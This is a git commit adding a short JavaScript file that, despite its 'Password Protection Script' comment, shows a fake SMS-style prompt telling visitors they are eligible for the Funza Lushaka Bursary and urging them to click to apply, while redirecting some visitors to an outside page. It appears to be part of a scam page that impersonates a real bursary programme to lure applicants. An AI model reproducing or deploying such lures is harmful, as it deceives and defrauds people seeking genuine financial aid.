0ff3b783c6744c189ac660176c762b0a381dd307
itidnewblog4 <ukpehaitid2@gmail.com>
2025-11-06 17:46:40 +0100

    Create active-funza.js

---
+++ active-funza.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'APPLY NOW'
+password = prompt(
+  'SMS: Congratulations! You are eligible for Funza Lushaka Bursary programme. Please press OK to apply now.',
+  'APPLY NOW'
+);
+if (password != 'APPLY NOW') {
+  location.href = 'https://phlug.org/funza.html';
+}
